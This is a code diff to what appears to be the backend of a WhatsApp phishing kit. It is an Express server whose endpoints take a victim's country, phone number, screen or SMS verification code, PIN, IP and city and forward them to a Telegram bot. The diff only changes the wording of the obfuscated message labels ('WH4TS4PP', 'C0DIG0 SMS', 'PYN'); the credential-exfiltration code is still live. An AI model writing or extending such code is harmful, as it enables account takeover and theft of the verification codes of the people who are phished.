@@ -74,7 +74,7 @@ app.post('/api/sendMessage3', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\nC0DIG0: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\n\nC0DIG0 PANTALLA: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -96,7 +96,7 @@ app.post('/api/sendMessage4', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\nC0DIG0 2: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\n\nC0DIG0 SMS: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -118,7 +118,7 @@ app.post('/api/sendMessage5', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔑🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\nPYN: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔑🟢WH4TS4PP🟢\nPAIS: ${user}\nC3L: ${user2}\n\nPYN: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
